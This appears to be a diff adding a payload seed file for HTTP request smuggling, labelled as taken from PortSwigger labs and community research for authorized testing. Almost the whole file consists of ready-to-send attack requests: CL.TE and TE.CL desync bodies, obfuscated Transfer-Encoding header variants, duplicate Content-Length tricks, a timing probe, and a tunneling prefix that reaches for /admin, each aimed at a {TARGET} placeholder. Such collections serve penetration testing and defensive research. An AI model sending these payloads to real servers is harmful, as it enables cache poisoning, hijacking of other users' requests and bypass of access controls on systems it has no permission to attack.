@@ -1,0 +1,66 @@
+# HTTP Request Smuggling — CL.TE / TE.CL seeds
+# Source: PortSwigger request-smuggling labs + community research
+# Tier: Curated | Authorized testing only
+# Use with Burp HTTP Request Smuggler extension for timing/differential confirmation
+
+# --- CL.TE (front-end CL, back-end TE) ---
+POST / HTTP/1.1
+Host: {TARGET}
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+
+# --- TE.CL (front-end TE, back-end CL) ---
+POST / HTTP/1.1
+Host: {TARGET}
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+
+
+# --- TE header obfuscation variants ---
+Transfer-Encoding : chunked
+Transfer-Encoding: xchunked
+Transfer-Encoding
+ : chunked
+Transfer-Encoding: chunked
+Transfer-Encoding: identity
+Transfer-Encoding: gzip, chunked
+
+# --- Tab / case variants ---
+Transfer-Encoding:	chunked
+transfer-encoding: chunked
+Transfer-encoding: chunked
+
+# --- Duplicate header smuggling ---
+Content-Length: 6
+Content-Length: 5
+Transfer-Encoding: chunked
+
+0
+
+G
+
+# --- CL.0 / wait-for-it style probe (timing) ---
+POST / HTTP/1.1
+Host: {TARGET}
+Content-Length: 0
+
+
+# --- Request tunneling prefix (research contexts) ---
+POST / HTTP/1.1
+Host: {TARGET}
+Content-Length: 44
+
+GET /admin HTTP/1.1
+Host: {TARGET}
+
+
+# --- HTTP/2 downgrade research (H2.TE / H2.CL) ---
+# Test via h2c upgrade or HTTP/2-capable proxy; confirm with Request Smuggler
